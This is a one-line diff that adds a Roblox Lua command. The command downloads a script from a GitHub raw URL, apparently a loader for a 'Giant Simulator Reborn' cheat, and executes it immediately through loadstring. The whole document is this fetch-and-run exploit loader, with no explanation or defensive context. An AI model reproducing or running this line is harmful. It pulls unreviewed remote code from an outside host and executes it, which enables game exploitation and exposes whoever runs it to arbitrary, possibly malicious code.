@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/giant-simulator-reborn-spam6-5n1vqbv9gqq9dl.lua"))()
